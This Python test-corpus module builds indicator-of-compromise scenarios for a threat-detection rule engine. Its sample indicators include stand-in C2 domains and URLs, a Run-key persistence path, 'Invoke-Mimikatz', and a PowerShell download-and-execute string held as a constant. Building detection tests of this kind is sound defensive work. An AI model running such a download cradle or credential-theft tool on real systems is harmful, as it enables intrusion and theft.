"""The Detection Engine validation corpus (Phase 4.5).

~110 deterministic ``InvestigationSummary`` scenarios covering every supported
IOC subject, severity, confidence band, ATT&CK mapping, multi-finding /
multi-IOC / conflicting / duplicate cases, and unsupported / malformed /
informational edges. A fixed ``NOW`` keeps generated output byte-stable so the
golden snapshot is reproducible. Built parametrically to stay compact.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import UTC, datetime

from threatlens.entities.types import EntityType
from threatlens.providers.aggregation import AttributedRelationship
from threatlens.providers.results import (
    Relationship,
    RelationshipTargetType,
    RelationshipType,
)
from threatlens.reasoning import (
    Confidence,
    ConfidenceBand,
    Finding,
    FindingCategory,
    InvestigationSummary,
    Severity,
)

NOW = datetime(2024, 6, 1, tzinfo=UTC)

_INFRA = FindingCategory.MALICIOUS_INFRASTRUCTURE
_MAL = FindingCategory.MALWARE
_INFO = FindingCategory.INFORMATIONAL

# Long constant values (kept out of the tuple tables to stay under the line limit).
_MD5 = "44d88612fea8a8f36de82e1278abb02f"
_SHA1 = "3395856ce81f2b7382dee72602f798b642f14140"
_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
_REG = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
_PS = "IEX (New-Object Net.WebClient).DownloadString('http://x/y')"
_URL = "http://malware-c2.example.net/gate.php?id=7"
_DOMAIN = "malware-c2.example.net"

_BANDS = {
    20: ConfidenceBand.LOW,
    55: ConfidenceBand.MODERATE,
    80: ConfidenceBand.HIGH,
    95: ConfidenceBand.VERY_HIGH,
}


def _conf(score: int) -> Confidence:
    return Confidence(score=score, band=_BANDS[score])


def _attack(technique: str) -> AttributedRelationship:
    return AttributedRelationship(
        relationship=Relationship(
            relationship=RelationshipType.USES,
            target_type=RelationshipTargetType.ATTACK_PATTERN,
            target_value=technique,
        ),
        sources=["mitre_attack"],
    )


def _f(
    fid: str,
    stype: EntityType,
    value: str,
    *,
    sev: Severity = Severity.HIGH,
    score: int = 80,
    cats: tuple[FindingCategory, ...] = (_INFRA,),
    sources: tuple[str, ...] = ("abuseipdb",),
    techniques: tuple[str, ...] = (),
) -> Finding:
    return Finding(
        id=fid,
        title=f"{stype.value}:{value}",
        categories=frozenset(cats),
        subject_type=stype,
        subject_value=value,
        severity=sev,
        confidence=_conf(score),
        sources=list(sources),
        relationships=[_attack(t) for t in techniques],
    )


def _s(entity_type: EntityType, entity_value: str, findings: list[Finding]) -> InvestigationSummary:
    top = max((f.confidence.score for f in findings), default=20)
    posture = max((f.severity for f in findings), default=Severity.INFORMATIONAL)
    return InvestigationSummary(
        entity_type=entity_type,
        entity_value=entity_value,
        posture=posture,
        overall_confidence=_conf(top),
        findings=findings,
        engine_version="1.0",
        generated_at=NOW,
    )


@dataclass(frozen=True)
class Scenario:
    """One corpus entry: an id, a summary, and whether it should yield no rules."""

    id: str
    summary: InvestigationSummary
    expect_empty: bool = False
    notes: str = field(default="", compare=False)


# (key, entity_type, value, primary category, ATT&CK technique)
_SUPPORTED: list[tuple[str, EntityType, str, FindingCategory, str]] = [
    ("ipv4", EntityType.IPV4, "45.155.205.233", _INFRA, "T1071"),
    ("ipv6", EntityType.IPV6, "2001:db8:dead:beef::1", _INFRA, "T1071"),
    ("domain", EntityType.DOMAIN, _DOMAIN, _INFRA, "T1071.001"),
    ("url", EntityType.URL, _URL, _INFRA, "T1105"),
    ("md5", EntityType.MD5, _MD5, _MAL, "T1204"),
    ("sha1", EntityType.SHA1, _SHA1, _MAL, "T1204"),
    ("sha256", EntityType.SHA256, _SHA256, _MAL, "T1204.002"),
    ("process", EntityType.PROCESS_NAME, "rundll32.exe", _MAL, "T1218.011"),
    ("registry", EntityType.REGISTRY_KEY, _REG, _MAL, "T1547.001"),
    ("powershell", EntityType.POWERSHELL_COMMAND, _PS, _MAL, "T1059.001"),
]

_UNSUPPORTED: list[tuple[str, EntityType, str]] = [
    ("cwe", EntityType.CWE, "CWE-79"),
    ("capec", EntityType.CAPEC, "CAPEC-66"),
    ("cve", EntityType.CVE, "CVE-2021-44228"),
    ("technique", EntityType.MITRE_TECHNIQUE, "T1059"),
    ("actor", EntityType.THREAT_ACTOR, "APT28"),
    ("malware_family", EntityType.MALWARE_FAMILY, "emotet"),
    ("email", EntityType.EMAIL, "attacker@evil.example.net"),
    ("file_name", EntityType.FILE_NAME, "invoice.exe"),
    ("windows_api", EntityType.WINDOWS_API, "VirtualAllocEx"),
    ("freetext", EntityType.FREETEXT, "some free text"),
    ("unknown", EntityType.UNKNOWN, "???"),
]


def _one(
    key: str,
    st: EntityType,
    val: str,
    cat: FindingCategory,
    *,
    sev: Severity = Severity.HIGH,
    score: int = 80,
    techniques: tuple[str, ...] = (),
) -> InvestigationSummary:
    finding = _f(f"fnd_{key}", st, val, sev=sev, score=score, cats=(cat,), techniques=techniques)
    return _s(st, val, [finding])


def _add(
    out: list[Scenario], sid: str, summary: InvestigationSummary, *, empty: bool = False
) -> None:
    out.append(Scenario(sid, summary, expect_empty=empty))


def _build() -> list[Scenario]:
    out: list[Scenario] = []

    # --- supported IOCs: 4 severities × 4 confidence bands + a bare variant -- #
    for key, st, val, cat, tech in _SUPPORTED:
        for sev in (Severity.LOW, Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL):
            summary = _one(key, st, val, cat, sev=sev, techniques=(tech,))
            _add(out, f"{key}_sev_{sev.name.lower()}", summary)
        for score in (20, 55, 80, 95):
            summary = _one(key, st, val, cat, score=score, techniques=(tech,))
            _add(out, f"{key}_conf_{score}", summary)
        _add(out, f"{key}_no_attack", _one(key, st, val, cat))

    # --- unsupported subjects (no rules) ----------------------------------- #
    for key, st, val in _UNSUPPORTED:
        _add(out, f"unsupported_{key}", _s(st, val, [_f(f"fnd_{key}", st, val)]), empty=True)

    # --- informational (no rules) ------------------------------------------ #
    for key, st, val, cat, _ in _SUPPORTED[:4]:
        summary = _one(key, st, val, cat, sev=Severity.INFORMATIONAL, score=20)
        _add(out, f"informational_{key}", summary, empty=True)
    info_only = [_f("fnd_ip", EntityType.IPV4, "8.8.8.8", sev=Severity.LOW, cats=(_INFO,))]
    _add(out, "informational_category_only", _s(EntityType.IPV4, "8.8.8.8", info_only), empty=True)

    # --- malformed hashes (Sigma still tags them; hash-validating gens skip) - #
    bad_md5 = [_f("fnd_h", EntityType.MD5, "abc", cats=(_MAL,))]
    _add(out, "malformed_md5_short", _s(EntityType.MD5, "abc", bad_md5))
    bad_sha = [_f("fnd_h", EntityType.SHA256, "z" * 64, cats=(_MAL,))]
    _add(out, "malformed_sha256_nonhex", _s(EntityType.SHA256, "z" * 64, bad_sha))

    # --- multi-finding on one IOC (deduplicated to one rule per generator) --- #
    for key, st, val, cat, tech in _SUPPORTED:
        findings = [
            _f("fnd_a", st, val, sev=Severity.MEDIUM, sources=("otx",), cats=(cat,)),
            _f("fnd_b", st, val, sev=Severity.CRITICAL, cats=(cat,), techniques=(tech,)),
        ]
        _add(out, f"multi_finding_{key}", _s(st, val, findings))

    # --- duplicate findings (identical but for id → one rule, no dup ids) ---- #
    for key, st, val, cat, tech in _SUPPORTED:
        dupes = [
            _f("fnd_dup_a", st, val, cats=(cat,), techniques=(tech,)),
            _f("fnd_dup_b", st, val, cats=(cat,), techniques=(tech,)),
        ]
        _add(out, f"duplicate_{key}", _s(st, val, dupes))

    # --- conflicting findings (malicious + informational on one subject) ---- #
    for key, st, val, cat, tech in _SUPPORTED[:6]:
        conflict = [
            _f("fnd_mal", st, val, sev=Severity.CRITICAL, cats=(cat,), techniques=(tech,)),
            _f("fnd_info", st, val, sev=Severity.INFORMATIONAL, score=20, cats=(_INFO,)),
        ]
        _add(out, f"conflicting_{key}", _s(st, val, conflict))

    # --- multi-IOC investigations (many artifacts across generators) -------- #
    out.extend(_multi_ioc_scenarios())

    # --- empty investigation (no findings) --------------------------------- #
    _add(out, "no_findings", _s(EntityType.IPV4, "1.1.1.1", []), empty=True)

    return out


def _multi_ioc_scenarios() -> list[Scenario]:
    ip_hash = [
        _f("fnd_ip", EntityType.IPV4, "45.155.205.233", techniques=("T1071",)),
        _f("fnd_hash", EntityType.SHA256, _SHA256, cats=(_MAL,), techniques=("T1204",)),
    ]
    dom_url = [
        _f("fnd_dom", EntityType.DOMAIN, _DOMAIN),
        _f("fnd_url", EntityType.URL, "http://malware-c2.example.net/x"),
    ]
    host = [
        _f("fnd_proc", EntityType.PROCESS_NAME, "rundll32.exe", cats=(_MAL,)),
        _f("fnd_reg", EntityType.REGISTRY_KEY, "HKLM\\Software\\Evil", cats=(_MAL,)),
        _f("fnd_ps", EntityType.POWERSHELL_COMMAND, "Invoke-Mimikatz", cats=(_MAL,)),
    ]
    mixed = [
        _f("fnd_ip", EntityType.IPV4, "203.0.113.7", techniques=("T1071",)),
        _f("fnd_cwe", EntityType.CWE, "CWE-79"),
    ]
    full = [
        _f("fnd_ip", EntityType.IPV4, "203.0.113.9"),
        _f("fnd_md5", EntityType.MD5, _MD5, cats=(_MAL,)),
        _f("fnd_dom", EntityType.DOMAIN, "evil.example.org", techniques=("T1071.001",)),
    ]
    return [
        Scenario("multi_ioc_ip_and_hash", _s(EntityType.IPV4, "45.155.205.233", ip_hash)),
        Scenario("multi_ioc_domain_and_url", _s(EntityType.DOMAIN, _DOMAIN, dom_url)),
        Scenario("multi_ioc_host_triad", _s(EntityType.PROCESS_NAME, "rundll32.exe", host)),
        Scenario("multi_ioc_mixed", _s(EntityType.IPV4, "203.0.113.7", mixed)),
        Scenario("multi_ioc_full_spectrum", _s(EntityType.IPV4, "203.0.113.9", full)),
    ]


CORPUS: list[Scenario] = _build()
